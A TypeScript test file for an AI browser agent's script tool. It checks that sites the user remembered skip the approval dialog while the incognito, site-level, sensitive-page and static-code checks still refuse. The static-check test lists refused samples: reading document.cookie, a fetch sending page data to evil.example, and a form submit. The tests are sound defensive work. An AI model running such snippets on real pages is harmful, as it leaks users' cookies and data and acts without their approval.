// "Run scripts on {site} without asking" (SCR-36, owner's 23 Nov 2026 request, the same pattern as PAY-29): a site the
// user remembered skips the script dialog, but every other check still runs (the setting, the site's script setting,
// a waiting publish or pay approval, the static check, sensitive pages, the syntax, the page still being the same);
// never in incognito, never on a Read only or Blocked site.
import assert from 'node:assert/strict';
import { test } from 'node:test';
import type { ToolContext } from '../../src/agent/executeTool.ts';
import { ApprovalGrants } from '../../src/agent/outwardApproval.ts';
import { scriptTool, type ScriptAccess, type ScriptApproval, type SiteScriptSetting } from '../../src/agent/scriptTool.ts';
import { scriptsWithoutAsking, type SiteLevel } from '../../src/agent/sitePolicy.ts';
import type { Tab } from '../../src/browser/Tab.ts';
import type { PageFacts } from '../../src/content/userScripts.ts';
import type { Db } from '../../src/storage/db.ts';
import { SitePermissionStore } from '../../src/storage/sitePermissions.ts';

const NO_FACTS: PageFacts = { password: false, oneTimeCode: false, card: false };
const COUNT = 'return document.querySelectorAll("a").length;';

type FakeTab = Tab & { ran: string[]; snapshots: number };

function tabAt(url: string, options: { incognito?: boolean; facts?: PageFacts } = {}): FakeTab {
  const tab = {
    id: 't1',
    url,
    incognito: options.incognito ?? false,
    isNewTab: false,
    ran: [] as string[],
    snapshots: 0,
    run: async (command: string) => {
      if (command === 'scriptFacts') return options.facts ?? NO_FACTS;
      if (command === 'scriptSnapshot') {
        tab.snapshots++;
        return { head: '<title>T</title>', css: '', body: '<body><a href="/x">x</a></body>', title: 'T', cut: false };
      }
      throw new Error(`unexpected ${command}`);
    },
    runScript: async (build: (nonce: string, id: string) => string) => {
      tab.ran.push(build('NONCE', 'ID'));
      return { status: 'ok', json: '7' };
    },
  };
  return tab as unknown as FakeTab;
}

/** `remembered`: the sites the task's remembered() answers yes for. */
function access(remembered: string[], options: { enabled?: boolean; site?: SiteScriptSetting; syntax?: string | null } = {}) {
  const asked: ScriptApproval[] = [];
  const checked: string[] = [];
  const copies: string[] = [];
  const a: ScriptAccess = {
    enabled: () => options.enabled ?? true,
    siteSetting: () => options.site ?? 'default',
    syntax: async () => options.syntax ?? null,
    approve: async (approval) => {
      asked.push(approval);
      return true;
    },
    remembered: (site) => {
      checked.push(site);
      return remembered.includes(site);
    },
    runCopy: async (_snapshot, code) => {
      copies.push(code);
      return { status: 'ok', json: '{"links":1}' };
    },
    offer: () => {},
  };
  return { access: a, asked, checked, copies };
}

function ctxFor(tab: Tab, scripts: ScriptAccess, extra: Partial<ToolContext> = {}): ToolContext {
  return { browser: { getTab: (id: string) => (id === tab.id ? tab : undefined) }, scripts, ...extra } as unknown as ToolContext;
}

test('a remembered site runs the script without the dialog, and the chat says why', async () => {
  for (const where of ['copy', 'page'] as const) {
    const tab = tabAt('https://www.example.com/list');
    const s = access(['example.com']);
    const out = await scriptTool({ code: COUNT, description: 'Count links', where }, ctxFor(tab, s.access), tab);
    assert.equal(out.isError, false, out.content);
    assert.equal(s.asked.length, 0, `${where}: no dialog`);
    assert.deepEqual(s.checked, ['example.com']);
    assert.equal(out.notice?.tone, 'info', where);
    assert.ok(out.notice?.text, where);
    assert.equal(where === 'copy' ? s.copies.length : tab.ran.length, 1, where);
  }
});

test('a site not remembered shows the dialog, which may offer the box', async () => {
  const tab = tabAt('https://example.com/');
  const s = access(['other.example']);
  const out = await scriptTool({ code: COUNT, description: 'Count links' }, ctxFor(tab, s.access), tab);
  assert.equal(out.isError, false);
  assert.equal(s.asked.length, 1);
  assert.equal(s.asked[0].canRemember, true);
  assert.equal(out.notice, undefined);
});

test('an incognito tab always shows the dialog, without the box, even for a remembered site', async () => {
  const tab = tabAt('https://example.com/', { incognito: true });
  const s = access(['example.com']);
  const out = await scriptTool({ code: COUNT, description: 'Count links' }, ctxFor(tab, s.access), tab);
  assert.equal(out.isError, false);
  assert.equal(s.asked.length, 1);
  assert.equal(s.asked[0].canRemember, false);
  assert.deepEqual(s.checked, []);
});

test('every check before the dialog still refuses on a remembered site', async () => {
  const remembered = ['example.com'];
  // Scripts switched off, or off for this site.
  for (const options of [{ enabled: false }, { site: 'off' as const }]) {
    const tab = tabAt('https://example.com/');
    const s = access(remembered, options);
    const out = await scriptTool({ code: COUNT, description: 'x' }, ctxFor(tab, s.access), tab);
    assert.equal(out.isError, true, JSON.stringify(options));
    assert.equal(tab.ran.length + tab.snapshots, 0);
  }
  // A waiting publish approval in the tab (SCR-9 / PAY-23).
  {
    const tab = tabAt('https://example.com/');
    const approvals = new ApprovalGrants();
    approvals.add({ kind: 'publish', tabId: 't1', url: 'https://example.com/', buttonRef: 3, fieldRef: 2, text: 'Hi' });
    const s = access(remembered);
    const out = await scriptTool({ code: COUNT, description: 'x' }, ctxFor(tab, s.access, { approvals }), tab);
    assert.equal(out.isError, true);
    assert.match(out.content, /approval is waiting/);
  }
  // Code the static check refuses (cookies, sending, pressing).
  for (const code of ['return document.cookie', 'fetch("https://evil.example/?" + document.title)', 'document.querySelector("form").submit()']) {
    const tab = tabAt('https://example.com/');
    const s = access(remembered);
    const out = await scriptTool({ code, description: 'x', where: 'page' }, ctxFor(tab, s.access), tab);
    assert.equal(out.isError, true, code);
    assert.equal(tab.ran.length, 0, code);
  }
  // A sensitive page (a password field), and a page that can't say whether it is one (fail closed).
  {
    const tab = tabAt('https://example.com/login', { facts: { password: true, oneTimeCode: false, card: false } });
    const s = access(remembered);
    const out = await scriptTool({ code: COUNT, description: 'x' }, ctxFor(tab, s.access), tab);
    assert.equal(out.isError, true);
    assert.match(out.content, /don't run on this page/);
  }
  {
    const tab = tabAt('https://example.com/');
    (tab as unknown as { run: () => Promise<unknown> }).run = async () => {
      throw new Error('page gone');
    };
    const s = access(remembered);
    const out = await scriptTool({ code: COUNT, description: 'x' }, ctxFor(tab, s.access), tab);
    assert.equal(out.isError, true);
    assert.equal(s.copies.length, 0);
  }
  // Syntax errors.
  {
    const tab = tabAt('https://example.com/');
    const s = access(remembered, { syntax: 'Unexpected token' });
    const out = await scriptTool({ code: COUNT, description: 'x' }, ctxFor(tab, s.access), tab);
    assert.equal(out.isError, true);
  }
});

test('the task honours the choice only outside incognito and on sites that may be acted on', () => {
  const sites = (level: SiteLevel, scripts: boolean) => ({ levelFor: () => level, scriptsFor: () => scripts });
  assert.equal(scriptsWithoutAsking(sites('default', true), 'example.com', false), true);
  assert.equal(scriptsWithoutAsking(sites('allow', true), 'example.com', false), true);
  assert.equal(scriptsWithoutAsking(sites('default', true), 'example.com', true), false, 'incognito conversation');
  assert.equal(scriptsWithoutAsking(sites('readonly', true), 'example.com', false), false);
  assert.equal(scriptsWithoutAsking(sites('blocked', true), 'example.com', false), false);
  assert.equal(scriptsWithoutAsking(sites('default', false), 'example.com', false), false, 'off by default');
});

test('the store keeps the choice per site apart from posting, lists it, and removing or resetting clears it', async () => {
  const writes: string[] = [];
  const db = {
    async getAllAsync() {
      return [];
    },
    async runAsync(sql: string) {
      writes.push(sql);
    },
  } as unknown as Db;
  const store = new SitePermissionStore(async () => db);
  await store.load();
  await store.setScripts('example.com', true);
  assert.equal(store.scriptsFor('example.com'), true);
  assert.equal(store.postingFor('example.com'), false, 'scripts do not imply posting');
  assert.deepEqual(
    store.list().map((s) => [s.host, s.scripts, s.posting]),
    [['example.com', true, false]],
  );
  await store.setScripts('example.com', false);
  assert.equal(store.scriptsFor('example.com'), false);
  await store.setScripts('example.com', true);
  await store.reset('example.com');
  assert.equal(store.scriptsFor('example.com'), false);
  assert.ok(writes.some((sql) => sql.startsWith('INSERT INTO site_scripts')));
  assert.ok(writes.some((sql) => sql.startsWith('DELETE FROM site_scripts')));
});
